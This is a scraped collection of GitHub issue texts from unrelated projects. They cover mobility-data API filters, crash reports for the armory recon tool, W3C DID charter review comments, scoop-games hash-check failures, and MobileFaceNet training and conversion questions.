Also from the Agency point of view, computing the state of a device by using the last event, without assuming anything on the business workflow of the provider, seems like the most stable route.

Attached PR: https://github.com/CityOfLosAngeles/mobility-data-specification/pull/247 @babldev contributed https://github.com/CityOfLosAngeles/mobility-data-specification/pull/139, which greatly simplifies filtering `/trips` by time. 

I agree with @oderby's comment on that PR that removing the `start_time` and `end_time` query parameters and replacing them with `min_end_time` and `max_end_time` would be a breaking change that should be deferred to MDS version 0.3. Until that arrives, however, this is going to continue to be a problem that will affect any sort of periodic MDS provider data ingestion pipeline.

Would it be possible to backport just adding those filters (without worrying about removing `start_time` or moving from floating-point seconds timestamps to integer milliseconds) to the next point release (v 0.2.2)? If that's a possibility I can prepare a PR for it.

If MDS v 0.3 is going to be released soon this might not be necessary. I'm curious to hear more about the `associated_trips` field in a status change. My questions are:
* Why/when would a single reservation event have multiple trips related to it?
* What additional information does this field provide that you couldn't determine by joining with trips on device_id and event_time?
<---------->
132055334
For instance, running a DomainSummaryReport or DomainOwnerReport has no option to include or exclude passive/active scope items. Would be really handy for analysis when you want to stay in scope. Looks like the ipwhois/asn.py function is failing on an improper registry lookup, which crashes armory.

**Error**
`Traceback (most recent call last):
  File "/usr/local/bin/armory", line 11, in <module>
    load_entry_point('depth-armory==1.0.0', 'console_scripts', 'armory')()
  File "/usr/local/lib/python2.7/dist-packages/armory/armory.py", line 427, in main
    run_module(Module, cmd_args, base_args.module)
  File "/usr/local/lib/python2.7/dist-packages/armory/armory.py", line 249, in run_module
    m.run(args)
  File "/usr/local/lib/python2.7/dist-packages/armory/included/ModuleTemplate.py", line 164, in run
    self.process_output(targets)
  File "/usr/local/lib/python2.7/dist-packages/armory/included/modules/Sublist3r.py", line 98, in process_output
    domain=new_domain
  File "/usr/local/lib/python2.7/dist-packages/armory/database/repositories.py", line 235, in find_or_create
    ip_address=i,
  File "/usr/local/lib/python2.7/dist-packages/armory/database/repositories.py", line 312, in find_or_create
    res = IPWhois(ip_str).lookup_whois()
  File "/usr/local/lib/python2.7/dist-packages/ipwhois/ipwhois.py", line 166, in lookup_whois
    get_asn_description=get_asn_description
  File "/usr/local/lib/python2.7/dist-packages/ipwhois/asn.py", line 498, in lookup
    raise ASNRegistryError('ASN registry lookup failed. '
ipwhois.exceptions.ASNRegistryError: ASN registry lookup failed. Permutations not allowed.`

**Commands Executed**
$ armory -m Ingestor -p -d _domain.com_
$ armory -m Sublist3r -i Looks like the ipwhois/asn.py function is failing on an improper registry lookup, which crashes armory.

**Error**
```Traceback (most recent call last):
  File "/usr/local/bin/armory", line 11, in <module>
    load_entry_point('depth-armory==1.0.0', 'console_scripts', 'armory')()
  File "/usr/local/lib/python2.7/dist-packages/armory/armory.py", line 427, in main
    run_module(Module, cmd_args, base_args.module)
  File "/usr/local/lib/python2.7/dist-packages/armory/armory.py", line 249, in run_module
    m.run(args)
  File "/usr/local/lib/python2.7/dist-packages/armory/included/ModuleTemplate.py", line 164, in run
    self.process_output(targets)
  File "/usr/local/lib/python2.7/dist-packages/armory/included/modules/Sublist3r.py", line 98, in process_output
    domain=new_domain
  File "/usr/local/lib/python2.7/dist-packages/armory/database/repositories.py", line 235, in find_or_create
    ip_address=i,
  File "/usr/local/lib/python2.7/dist-packages/armory/database/repositories.py", line 312, in find_or_create
    res = IPWhois(ip_str).lookup_whois()
  File "/usr/local/lib/python2.7/dist-packages/ipwhois/ipwhois.py", line 166, in lookup_whois
    get_asn_description=get_asn_description
  File "/usr/local/lib/python2.7/dist-packages/ipwhois/asn.py", line 498, in lookup
    raise ASNRegistryError('ASN registry lookup failed. '
ipwhois.exceptions.ASNRegistryError: ASN registry lookup failed. Permutations not allowed.
```

**Commands Executed**
$ armory -m Ingestor -p -d _domain.com_
$ armory -m Sublist3r -i Module is reporting false-positives for lack of PFS.  Redacted SSLScan XML output attached
[SSLScan_PFS.xml.gz](https://github.com/depthsecurity/armory/files/2829700/SSLScan_PFS.xml.gz)

 Module is reporting false-positives for lack of PFS.  Redacted SSLScan XML output attached
[SSLScan_PFS.xml.gz](https://github.com/depthsecurity/armory/files/2829700/SSLScan_PFS.xml.gz)


<---------->
132532607
"The Credentials Community Group has developed a Final Community Group Specification for Decentralized Identifiers that has been shipped in multiple production-grade commercial systems that will serve as input for this document."

We should be starting with a set of requirements not a specification, that can follow, if the proposed specification has a set of requirements these should be listed in the charter by a normative document of some sort, if not then a proposed specification without requirements is not really useful  The charter only lists the specification of DID documents, but not the DID url itself (the DID scheme).  This is a critical omission. "Decentralized Identifiers (DIDs) are a new type of identifier for verifiable, "self-sovereign" digital identity. DIDs are fully under the control of the DID subject, independent from any centralized registry, identity provider, or certificate authority. DIDs are URLs that relate a DID subject to means for trustable interactions with that subject. DIDs resolve to DID Documents — simple documents that describe how to use that specific DID."

These don't have to be verifiable (since there is no verification mechanism specified" and they don't have to be under control of the DID subject, also there is no mechanisms stated to show "trustable interations"

I suggest a reword to make this more general and no statements about verification or trust since these are out of scope  "Each DID Document may express cryptographic material, verification methods, and/or service endpoints. **These provide a set of mechanisms which enable a DID controller to prove control of the DID**."

Is this WG defining "mechanisms" for authentication?   The coordination section should add W3C working, interest, and community groups with whom the DIDWG will coordinate.
 The "Self-Sovereign Principles" document has shaped much of the thought and direction of decentralized identifiers, so there should be a reference to it in the charter. "Decentralized Identifiers (DIDs) are a new type of identifier for verifiable, "self-sovereign" digital identity. DIDs are fully under the control of the DID subject, independent from any centralized registry, identity provider, or certificate authority. DIDs are URLs that relate a DID subject to means for trustable interactions with that subject. DIDs resolve to DID Documents — simple documents that describe how to use that specific DID."

These don't have to be verifiable (since there is no verification mechanism specified" and they don't have to be under control of the DID subject, also there is no mechanisms stated to show "trustable interations"

I suggest a reword to make this more general and no statements about verification or trust since these are out of scope  "Verifiable Claims Working Group
Coordination on named graph indexing and other concerns regarding support for normalization and digital signatures"

Remove or reword as there is no normalization or signatures in VC WG, there should be no dependencies on VC for DID It remains unclear to me what DIDs can do that can't be done much simpler by https URLs and/or public keys. It remains especially unclear what purpose blockchain technology serves in any of this.

I read some of the [use cases document](https://docs.google.com/document/d/1wz8sakevXzO2OSMP341w7M2LjAMZfEQaTQEm_AOs3_Q), but I didn't see any that actually justified this work.  A proper use case should tell a story of a problem being solved by DIDs that isn't reasonably solved without them.  The ones I read were not doing that at all.  They were fairly vague, talking about some problem around identity or decentralization, and suggesting that somehow DIDs would help.

A use cases document should not waste the reader's time with any stories that do not hold water, but for now I'd be okay with a pointer one that does.  It should tell me about a realistic situation where someone would reasonably put in real effort or money to be able to use a DID, because it really solves their problem, and does it better than alternatives.

If I sound a little grumpy here, it's because this is not a new request.    https://github.com/w3ctag/design-reviews/issues/216 The coordination section should add W3C working, interest, and community groups with whom the DIDWG will coordinate.
 "The controller of a DID can cryptographically authenticate themselves (e.g. DID-based website login) ."

This should be removed as authentication out of scope for this WG and I'm not sure that a DID must always provide this feature 

." "Each DID Document contains at least three things: cryptographic material, authentication suites, and service endpoints. Cryptographic material combined with authentication suites provide a set of mechanisms to authenticate as the DID subject (e.g. public keys, pseudonymous biometric protocols, etc.)."

Reword as there should be no authentication discussed in this WG and as I understand it there should be no mechanisms defined here for authentication, signatures, or crypto

 This charter does not make sense if there is nothing to interoperate on, there needs to be some DID methods defined, w/o this you can never be assured of interop, I understand there may some proprietary ones but there needs to be a base line here,  So I'm going to question the name of this WG as I don't think that this identifier mandates "decentralization", that seems mandate the usage, the usage should be up to the deployment This charter does not make sense if there is nothing to interoperate on, there needs to be some DID methods defined, w/o this you can never be assured of interop, I understand there may some proprietary ones but there needs to be a base line here,  Please add "defining any authentication mechanisms,  signing mechanisms or cryptography mechanisms" or what ever wording you see fit to express that these are out of scope "These new identifiers are designed to enable the controller of a DID to prove control over it and to be implemented independently of any centralized registry, identity provider, or certificate authority"

I assume that a DID can be used by a centralized registry, identity provider, or certificate authority and the "independently" is not a requirement? "DIDs are URLs that relate a DID subject to means for trustable interactions with that subject"

I'm not sure about this sentence as it would be hard to parse for non-native English speakers Section 1.2 Success Criteria specifies a test suite, but that is not listed as a deliverable in Section 1. Scope.

IMO, this is editorial since, clearly, a test suite is meant to be a deliverable of the working group. Since the charter does not include actually defining DID methods and is only defining mandatory operations and since the data model is driven from the usecases that the WG derives it seems out of place and potentially limiting the usage and deployment of DIDs by specifying a “rubric” as URLs (RFC 3986) have no rubrics attached to them neither should these identifiers as they are just identifiers. Suggest that “rubrics” creation be removed from the charter and if there is interest in doing this it be done outside the W3C DID WG (i.e. Decentralized Identity Foundation)  and let the usecase drive and not limit how these identifiers will be used.

REMOVE the following from the charter:
“Recommend a rubric of decentralized characteristics for DID Method specifications. This allows the DID Method specifications to self-certify, or independent third parties to evaluate, the DID Method specification's level of adherence to principles of decentralization. 

“Decentralized Characteristics Rubric v1.0
The Working Group will develop a rubric of decentralized characteristics for DID Method specifications. This rubric will provide reference points according to which a DID Method specification may self-certify, or an independent third party may evaluate, the DID Method specification's level of adherence to principles of decentralization.”



<---------->
132575997
Whenever I `scoop install minecraft`, once downloaed it errors out  by giving me the `ERROR Hash check failed!` ```
Installing 'minecraft' (java-edition) [64bit]
Starting download with aria2 ...
Download: Download Results:
Download: gid   |stat|avg speed  |path/URI
Download: ======+====+===========+=======================================================
Download: 64b427|OK  |   798KiB/s|C:/Users/natob/scoop/cache/minecraft#java-edition#https_launcher.mojang.com_download_Minecraft.exe
Download: Status Legend:
Download: (OK):download completed.
Checking hash of Minecraft.exe ... ERROR Hash check failed!
App:         games/minecraft
URL:         https://launcher.mojang.com/download/Minecraft.exe
First bytes: 4D 5A 90 00 03 00 00 00
Expected:    a76c2c056fc762f875471d1d49c108ecf23939b9abde5f38b59529af250469ef
Actual:      f391a3c42bd3cc19bf76cf62de164b263ee2a6e9b3994120c3c613fb30af7476

Please try again or create a new issue by using the following link and paste your console output:
https://github.com/Calinou/scoop-games/issues/new?title=minecraft%40java-edition%3a+hash+check+failed
``` Whenever I `scoop install minecraft`, once downloaed it errors out  by giving me the `ERROR Hash check failed!` Name: osu!
Description: the bestest free-to-win and open-source rhythm game.
Homepage: https://osu.ppy.sh/home
Download: https://osu.ppy.sh/home/download Hi! I tried to install Steam using `scoop`, but I've ran into an issue.

First, it gets stuck there : 

![Updating Steam](https://user-images.githubusercontent.com/10495562/55698346-5acd9d80-5993-11e9-8f57-5d16dcc22d55.PNG)

After a few minutes, there's this error : 

![Fatal Error](https://user-images.githubusercontent.com/10495562/55698359-68832300-5993-11e9-9608-6be59e8db876.PNG)

I also tried to run Steam's installer over the `current` folder just to see what happens, and I got the same issue. Probably a problem on Steam's part, but I'd like to see if you have any idea of how to get around this. The hash has changed for Minecraft.exe

```
scoop install minecraft
Installing 'minecraft' (java-edition) [64bit]
Minecraft.exe (1.5 MB) 

Checking hash of Minecraft.exe ... ERROR Hash check failed!
App:         games/minecraft
URL:         https://launcher.mojang.com/download/Minecraft.exe
First bytes: 4D 5A 90 00 03 00 00 00
Expected:    a76c2c056fc762f875471d1d49c108ecf23939b9abde5f38b59529af250469ef
Actual:      f391a3c42bd3cc19bf76cf62de164b263ee2a6e9b3994120c3c613fb30af7476
```

This is a separate hash I made using a manually downloaded copy of Minecraft. All download links can be found on this page as well. https://www.minecraft.net/en-us/download/alternative/ Minecraft.exe is labelled "Windows (Alternative)".

```
Name: Minecraft.exe
Size: 1526144 bytes (1490 KiB)
SHA256: F391A3C42BD3CC19BF76CF62DE164B263EE2A6E9B3994120C3C613FB30AF7476
``` BGB, Kega-Fusion and Snes9x don't have persist folders.
Please add them. Enigma is a puzzle game inspired by Oxyd on the Atari ST and Rock'n'Roll on the Amiga. The object of the game is to find uncover pairs of identically colored Oxyd stones.

Homepage https://www.nongnu.org/enigma/index.html
Download https://www.nongnu.org/enigma/download.html#stable Hi! I tried to install Steam using `scoop`, but I've ran into an issue.

First, it gets stuck there : 

![Updating Steam](https://user-images.githubusercontent.com/10495562/55698346-5acd9d80-5993-11e9-8f57-5d16dcc22d55.PNG)

After a few minutes, there's this error : 

![Fatal Error](https://user-images.githubusercontent.com/10495562/55698359-68832300-5993-11e9-9608-6be59e8db876.PNG)

I also tried to run Steam's installer over the `current` folder just to see what happens, and I got the same issue. Probably a problem on Steam's part, but I'd like to see if you have any idea of how to get around this. ```
Installing 'minecraft' (java-edition) [64bit]
Starting download with aria2 ...
Download: Download Results:
Download: gid   |stat|avg speed  |path/URI
Download: ======+====+===========+=======================================================
Download: 64b427|OK  |   798KiB/s|C:/Users/natob/scoop/cache/minecraft#java-edition#https_launcher.mojang.com_download_Minecraft.exe
Download: Status Legend:
Download: (OK):download completed.
Checking hash of Minecraft.exe ... ERROR Hash check failed!
App:         games/minecraft
URL:         https://launcher.mojang.com/download/Minecraft.exe
First bytes: 4D 5A 90 00 03 00 00 00
Expected:    a76c2c056fc762f875471d1d49c108ecf23939b9abde5f38b59529af250469ef
Actual:      f391a3c42bd3cc19bf76cf62de164b263ee2a6e9b3994120c3c613fb30af7476

Please try again or create a new issue by using the following link and paste your console output:
https://github.com/Calinou/scoop-games/issues/new?title=minecraft%40java-edition%3a+hash+check+failed
``` Supertuxkart version 1.0 has been released
http://blog.supertuxkart.net/2019/04/supertuxkart-10-release.html Name: BGB
Description: BGB is a GameBoy emulator/debugger which runs on Windows and Wine.
Homepage: http://bgb.bircd.org
Download: http://bgb.bircd.org/#downloads Attempting to install minecraft produced the following output (usernames have been changed) : 

PS C:\Users\foo> scoop install minecraft
WARN  Scoop uses 'aria2c' for multi-connection downloads.
WARN  Should it cause issues, run 'scoop config aria2-enabled false' to disable it.
Installing 'minecraft' (java-edition) [64bit]
Starting download with aria2 ...
Download: [#2704db 0B/0B CN:1 DL:0B]
Download: [#2704db 208KiB/2.0MiB(10%) CN:1 DL:213KiB ETA:8s]
Download: [#2704db 416KiB/2.0MiB(20%) CN:1 DL:210KiB ETA:7s]
Download: [#2704db 656KiB/2.0MiB(31%) CN:1 DL:218KiB ETA:6s]
Download: [#2704db 880KiB/2.0MiB(42%) CN:1 DL:222KiB ETA:5s]
Download: [#2704db 1.0MiB/2.0MiB(52%) CN:1 DL:218KiB ETA:4s]
Download: [#2704db 1.2MiB/2.0MiB(63%) CN:1 DL:217KiB ETA:3s]
Download: [#2704db 1.4MiB/2.0MiB(73%) CN:1 DL:218KiB ETA:2s]
Download: [#2704db 1.7MiB/2.0MiB(85%) CN:1 DL:221KiB ETA:1s]
Download: [#2704db 1.8MiB/2.0MiB(94%) CN:1 DL:216KiB]
Download: Download Results:
Download: gid   |stat|avg speed  |path/URI
Download: ======+====+===========+=======================================================
Download: 2704db|OK  |   214KiB/s|C:/Users/foo/scoop/cache/minecraft#java-edition#https_launcher.mojang.com_download_Minecraft.exe
Download: Status Legend:
Download: (OK):download completed.
Checking hash of Minecraft.exe ... ERROR Hash check failed!
App:         games/minecraft
URL:         https://launcher.mojang.com/download/Minecraft.exe
First bytes: 4D 5A 90 00 03 00 00 00
Expected:    f391a3c42bd3cc19bf76cf62de164b263ee2a6e9b3994120c3c613fb30af7476
Actual:      b8e54a71ffc79bb9c95902f877dca7e1880b907ea94ff9659bb1a927808787a2

Please try again or create a new issue by using the following link and paste your console output:
https://github.com/Calinou/scoop-games/issues/new?title=minecraft%40java-edition%3a+hash+check+failed BGB, Kega-Fusion and Snes9x don't have persist folders.
Please add them. Sorry, once more a mismatch of the md5 check...

Best regards,
Werner



Scoop was updated successfully!
Installing 'minecraft' (java-edition) [64bit]
Minecraft.exe (2.1 MB) [================================================================] 100%
Checking hash of Minecraft.exe ... ERROR Hash check failed!
App:         games/minecraft
URL:         https://launcher.mojang.com/download/Minecraft.exe
First bytes: 4D 5A 90 00 03 00 00 00
Expected:    22954f65c6ea85374c7af7ec4cd617b022044a31445b1dc4dede3129fd5d4920
Actual:      a541356a3103201145eac713c3a056674253634d895810b249f87d2d7a654d17

Please try again or create a new issue by using the following link and paste your console output:
https://github.com/Calinou/scoop-games/issues/new?title=minecraft%40java-edition%3a+hash+check+failed https://github.com/Anuken/Mindustry
 [Blitz.gg](https://blitz.gg/) is an app that helps find runes and builds in [League of Legends](https://leagueoflegends.com/)'s champion selection phase. Its installer is an archive containing a `.nupkg`, which I've heard can be used by Scoop. Enigma is a puzzle game inspired by Oxyd on the Atari ST and Rock'n'Roll on the Amiga. The object of the game is to find uncover pairs of identically colored Oxyd stones.

Homepage https://www.nongnu.org/enigma/index.html
Download https://www.nongnu.org/enigma/download.html#stable As requested in https://github.com/Calinou/scoop-games/issues/24 , https://github.com/Calinou/scoop-games/pull/27 brought Mindustry to scoop. 
However, a) the json hasn't been updated in quite some time (the server binary has been)
b) it would maybe make more sense to provide the client via [Windows-64bit]Mindustry.zip from https://anuke.itch.io/mindustry ?
I don't know if direct linking to itch.io downloads is a thing though.. The hash has changed for Minecraft.exe

```
scoop install minecraft
Installing 'minecraft' (java-edition) [64bit]
Minecraft.exe (1.5 MB) 

Checking hash of Minecraft.exe ... ERROR Hash check failed!
App:         games/minecraft
URL:         https://launcher.mojang.com/download/Minecraft.exe
First bytes: 4D 5A 90 00 03 00 00 00
Expected:    a76c2c056fc762f875471d1d49c108ecf23939b9abde5f38b59529af250469ef
Actual:      f391a3c42bd3cc19bf76cf62de164b263ee2a6e9b3994120c3c613fb30af7476
```

This is a separate hash I made using a manually downloaded copy of Minecraft. All download links can be found on this page as well. https://www.minecraft.net/en-us/download/alternative/ Minecraft.exe is labelled "Windows (Alternative)".

```
Name: Minecraft.exe
Size: 1526144 bytes (1490 KiB)
SHA256: F391A3C42BD3CC19BF76CF62DE164B263EE2A6E9B3994120C3C613FB30AF7476
```
<---------->
133120471
The demo is now using ABC.
I got 'transaction txins empty' error when used with BSV.
<---------->
133372977
 我用softmax训练17万次后（lr=0.1, batch 90）再用arcface训练[batch 90]几万步就会出现loss 无效的问题，请问这个要怎么解决？大神有完整的训练过吗，从softmax 到arcface 参数设置?
 The error is AttributeError: 'NoneType' object has no attribute 'model_checkpoint_path' when I run the train_nets.py using the pre-trained model MobileFaceNet_9925_9680.pb.
#193 ckpt = tf.train.get_checkpoint_state(pretrained_model) output ckpt = None.

The command in terminal is:
python train_nets.py --eval_db_path /<my directory>/faces_emore --tfrecords_file_path /<my directory>/tfrecords --pretrained_model /<my directory>/MobileFaceNet_9925_9680.pb

How can I solve it?
Thanks Hi,
How to compare distance/similarity between two faces' features.
I tries below methods but failed.
diff = np.subtract(f2, f1)
dist = np.sum(np.square(diff), 1)
dist = np.linalg.norm(diff, axis=1)
dist = sklearn.metrics.pairwise_distances(f1,f2, metric='cosine')

Thanks for the help!! Hi,
I'm doing 1:1 face verification. I tried to use this model but getting different cosine distances for face_pairs. I'm really confused.
Does the embeddings that are calculated by mobilefacenet are in the Euclidean space where distances
directly correspond to a measure of face similarity?
If not, how to calculate the similarity between two faces? As, I'm not planning to uses any clustering algorithm. when I convert the pb file to ckpt, it raise the ValueError ("No variables to save"), so is this any solution. What is your classification accuracy (approximate value) towards the end of training? and what is the general range to be expected for classification scores? 
I am using a variant of mobilenet and my classification accuracy is abut 0.54 with around 90K classes(unique faces).   thanks for your good repo. maybe there has some miswake in network define
1、
in https://github.com/sirius-ai/MobileFaceNet_TF/blob/master/nets/MobileFaceNet.py#L52-L63
should be 
```python
_CONV_DEFS = [
    Conv(kernel=[3, 3], stride=2, depth=64, ratio=1),
    DepthwiseConv(kernel=[3, 3], stride=1, depth=64, ratio=1),
    InvResBlock(kernel=[3, 3], stride=2, depth=64, ratio=2, repeate=1), （first stride set to 2）
    InvResBlock(kernel=[3, 3], stride=1, depth=64, ratio=2, repeate=4),   （set stride to 1)
    InvResBlock(kernel=[3, 3], stride=2, depth=128, ratio=4, repeate=1),
    InvResBlock(kernel=[3, 3], stride=1, depth=128, ratio=2, repeate=6),
    InvResBlock(kernel=[3, 3], stride=2, depth=128, ratio=4, repeate=1),
    InvResBlock(kernel=[3, 3], stride=1, depth=128, ratio=2, repeate=2),
    Conv(kernel=[1, 1], stride=1, depth=512, ratio=1),
]
```
2、 first depthwise conv maybe not conv_em  in https://github.com/sirius-ai/MobileFaceNet_TF/blob/master/nets/MobileFaceNet.py#L138
 想请问下作者训练的inference loss大概收敛到多少，我的loss最终总是在8-10左右 How can I adapt your MobileFaceNet model to process standart Mobilenet image size? 
You have defined a variable mobilenet_v2.default_image_size = 112, but it is not used anywhere I think. Thanks In the path of `arch/pretrained_model`, i use under shell to convert model to tflite.
```shell
tflite_convert  ^
--output_file  MobileFaceNet_9925_9680.tflite  ^
--graph_def_file  MobileFaceNet_9925_9680.pb    ^
--input_arrays  "input"  ^
--input_shapes  "1,112,112,3"  ^
--output_arrays  embeddings  ^
--output_format  TFLITE
```
Unfortunate, i get error of this.
```shell
λ tflite_convert  ^
More? --output_file  MobileFaceNet_9925_9680.tflite  ^
More? --graph_def_file  MobileFaceNet_9925_9680.pb    ^
More? --input_arrays  "input"  ^
More? --input_shapes  "1,112,112,3"  ^
More? --output_arrays  embeddings  ^
More? --output_format  TFLITE
2019-05-28 15:32:07.380246: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX AVX2
2019-05-28 15:32:08.157890: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1433] Found device 0 with properties:
name: GeForce MX150 major: 6 minor: 1 memoryClockRate(GHz): 1.341
pciBusID: 0000:01:00.0
totalMemory: 2.00GiB freeMemory: 1.62GiB
2019-05-28 15:32:08.185527: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1512] Adding visible gpu devices: 0
2019-05-28 15:32:08.727623: I tensorflow/core/common_runtime/gpu/gpu_device.cc:984] Device interconnect StreamExecutor with strength 1 edge matrix:
2019-05-28 15:32:08.742876: I tensorflow/core/common_runtime/gpu/gpu_device.cc:990]      0
2019-05-28 15:32:08.753078: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1003] 0:   N
2019-05-28 15:32:08.764321: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1115] Created TensorFlow device (/job:localhost/replica:0/task:0/device:GPU:0 with 1365 MB memory) -> physical GPU (device: 0, name: GeForce MX150, pci bus id: 0000:01:00.0, compute capability: 6.1)
Traceback (most recent call last):
  File "C:\ProgramData\Anaconda3\Scripts\tflite_convert-script.py", line 10, in <module>
    sys.exit(main())
  File "C:\ProgramData\Anaconda3\lib\site-packages\tensorflow\lite\python\tflite_convert.py", line 442, in main
    app.run(main=run_main, argv=sys.argv[:1])
  File "C:\ProgramData\Anaconda3\lib\site-packages\tensorflow\python\platform\app.py", line 125, in run
    _sys.exit(main(argv))
  File "C:\ProgramData\Anaconda3\lib\site-packages\tensorflow\lite\python\tflite_convert.py", line 438, in run_main
    _convert_model(tflite_flags)
  File "C:\ProgramData\Anaconda3\lib\site-packages\tensorflow\lite\python\tflite_convert.py", line 191, in _convert_model
    output_data = converter.convert()
  File "C:\ProgramData\Anaconda3\lib\site-packages\tensorflow\lite\python\lite.py", line 455, in convert
    **converter_kwargs)
  File "C:\ProgramData\Anaconda3\lib\site-packages\tensorflow\lite\python\convert.py", line 442, in toco_convert_impl
    input_data.SerializeToString())
  File "C:\ProgramData\Anaconda3\lib\site-packages\tensorflow\lite\python\convert.py", line 205, in toco_convert_protos
    "TOCO failed. See console for info.\n%s\n%s\n" % (stdout, stderr))
tensorflow.lite.python.convert.ConverterError: TOCO failed. See console for info.
2019-05-28 15:32:13.074828: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX AVX2
2019-05-28 15:32:13.078767: E tensorflow/core/framework/op_kernel.cc:1325] OpKernel ('op: "WrapDatasetVariant" device_type: "CPU"') for unknown op: WrapDatasetVariant
2019-05-28 15:32:13.079077: E tensorflow/core/framework/op_kernel.cc:1325] OpKernel ('op: "WrapDatasetVariant" device_type: "GPU" host_memory_arg: "input_handle" host_memory_arg: "output_handle"') for unknown op: WrapDatasetVariant
2019-05-28 15:32:13.079438: E tensorflow/core/framework/op_kernel.cc:1325] OpKernel ('op: "UnwrapDatasetVariant" device_type: "CPU"') for unknown op: UnwrapDatasetVariant
2019-05-28 15:32:13.079756: E tensorflow/core/framework/op_kernel.cc:1325] OpKernel ('op: "UnwrapDatasetVariant" device_type: "GPU" host_memory_arg: "input_handle" host_memory_arg: "output_handle"') for unknown op: UnwrapDatasetVariant
2019-05-28 15:32:13.087213: E tensorflow/lite/toco/import_tensorflow.cc:2079] tensorflow::ImportGraphDef failed with status: Not found: Op type not registered 'Placeholder' in binary running on DESKTOP-TG1FKM4. Make sure the Op and Kernel are registered in the binary running in this process. Note that if you are loading a saved graph which used ops from tf.contrib, accessing (e.g.) `tf.contrib.resampler` should be done before importing the graph, as contrib ops are lazily registered when the module is first accessed.
2019-05-28 15:32:13.434412: I tensorflow/lite/toco/graph_transformations/graph_transformations.cc:39] Before Removing unused ops: 2747 operators, 4533 arrays (0 quantized)
2019-05-28 15:32:13.816499: I tensorflow/lite/toco/graph_transformations/graph_transformations.cc:39] After Removing unused ops pass 1: 1810 operators, 3076 arrays (0 quantized)
2019-05-28 15:32:14.122395: I tensorflow/lite/toco/graph_transformations/graph_transformations.cc:39] Before general graph transformations: 1810 operators, 3076 arrays (0 quantized)
2019-05-28 15:32:14.124627: F tensorflow/lite/toco/graph_transformations/resolve_tensorflow_switch.cc:98] Check failed: other_op->type == OperatorType::kMerge Found BatchNormalization as non-selected output from Switch, but only Merge supported.
``` hi：
   the problem is accuracy is always 0 when i applying train_net.py,meanwhile,the loss is decreasing and accuracy on lfw is incresing.
   i think that i applyed the one you revised at num_class..look at the error below:

class_number:85742(MS1M-V2)

epoch 0, total_step 1250, total loss is 42.33 , inference loss is 42.01, reg_loss is 0.32, training accuracy is 0.000000, time 323.625 samples/sec
epoch 0, total_step 1300, total loss is 42.36 , inference loss is 42.03, reg_loss is 0.32, training accuracy is 0.000000, time 319.744 samples/sec
epoch 0, total_step 1350, total loss is 42.08 , inference loss is 41.76, reg_loss is 0.32, training accuracy is 0.000000, time 322.450 samples/sec
epoch 0, total_step 1400, total loss is 42.24 , inference loss is 41.92, reg_loss is 0.32, training accuracy is 0.000000, time 319.986 samples/sec
epoch 0, total_step 1450, total loss is 42.51 , inference loss is 42.19, reg_loss is 0.32, training accuracy is 0.000000, time 322.289 samples/sec
epoch 0, total_step 1500, total loss is 42.49 , inference loss is 42.17, reg_loss is 0.32, training accuracy is 0.000000, time 318.947 samples/sec
epoch 0, total_step 1550, total loss is 42.36 , inference loss is 42.04, reg_loss is 0.32, training accuracy is 0.000000, time 314.517 samples/sec
epoch 0, total_step 1600, total loss is 42.45 , inference loss is 42.14, reg_loss is 0.31, training accuracy is 0.000000, time 324.133 samples/sec
epoch 0, total_step 1650, total loss is 42.35 , inference loss is 42.03, reg_loss is 0.31, training accuracy is 0.000000, time 322.223 samples/sec
epoch 0, total_step 1700, total loss is 42.44 , inference loss is 42.12, reg_loss is 0.31, training accuracy is 0.000000, time 323.349 samples/sec

thresholds max: 0.71 <=> min: 0.49
total time 13.695s to evaluate 12000 images of lfw
Accuracy: 0.716+-0.016
Validation rate: 0.03367+-0.01538 @ FAR=0.00100
fpr and tpr: 0.725 0.875
Area Under Curve (AUC): 0.799
Equal Error Rate (EER): 0.275

  When running 'test_nets.py' with pretrained model "MobileFaceNet_9925_9680.pb", met below issue，

MobileFaceNet_TF$ python test_nets.py --model=./arch/pretrained_model/MobileFaceNet_9925_9680.pb
begin db lfw convert.
loading bin 1000
loading bin 2000
loading bin 3000
loading bin 4000
loading bin 5000
loading bin 6000
loading bin 7000
loading bin 8000
loading bin 9000
loading bin 10000
loading bin 11000
loading bin 12000
(12000, 112, 112, 3)
Model filename: ./arch/pretrained_model/MobileFaceNet_9925_9680.pb
Runnning forward pass on lfw images

Traceback (most recent call last):
  File "test_nets.py", line 143, in <module>
    main(parse_arguments(sys.argv[1:]))
  File "test_nets.py", line 104, in main
    emb_array = np.zeros((data_sets.shape[0], embedding_size))
TypeError: __index__ returned non-int (type NoneType)

MobileFaceNet_TF$ python --version
Python 3.4.3

BTW, test_nets.py can work well with default output/ckpt checkpoint files.
MobileFaceNet_TF$ python test_nets.py
begin db lfw convert.
loading bin 1000
loading bin 2000
loading bin 3000
loading bin 4000
loading bin 5000
loading bin 6000
loading bin 7000
loading bin 8000
loading bin 9000
loading bin 10000
loading bin 11000
loading bin 12000
(12000, 112, 112, 3)
Model directory: ./output/ckpt
Metagraph file: MobileFaceNet_pretrain.ckpt.meta
Checkpoint file: MobileFaceNet_pretrain.ckpt
Runnning forward pass on lfw images

thresholds max: 1.47 <=> min: 1.41
total time 974.123s to evaluate 12000 images of lfw
Accuracy: 0.993+-0.005
Validation rate: 0.98800+-0.00933 @ FAR=0.00100
fpr and tpr: 0.502 0.838
Area Under Curve (AUC): 0.999
Equal Error Rate (EER): 0.007

please help look at the issue, thank you. What is the threshold if i want to do 1:1 face matching in mobile phone with .pb model ?

i had tried set threshold to 1.234 ,but it seem do not work well. How to get the tpr, fpr, accuracy, val, val_std, far indicator results.
In the test_nets.py,I found code under. however the parameter of `issame_list` is the list of boolean, I don' t understand that?
```py
tpr, fpr, accuracy, val, val_std, far = evaluate(emb_array, issame_list, nrof_folds=args.eval_nrof_folds)```
 I am trying to implement arcface loss for facenet training.
I replaced cross_entropy_mean with arcface_mean which I got from arc face function.
The loss is around 40 and accuracy is 0.00 and not changing. The loss is increasing.
Any suggestion what I might be doing wrong?
 hi，can you provide your training ckpt model files， I am having problems to deploy your model on mobile devices 你好,我使用MS-Celeb-1M的数据训练，参数按照你默认的参数进行设置，但是模型的的loss一直不下降维持在40左右，请问大佬什么建议吗？
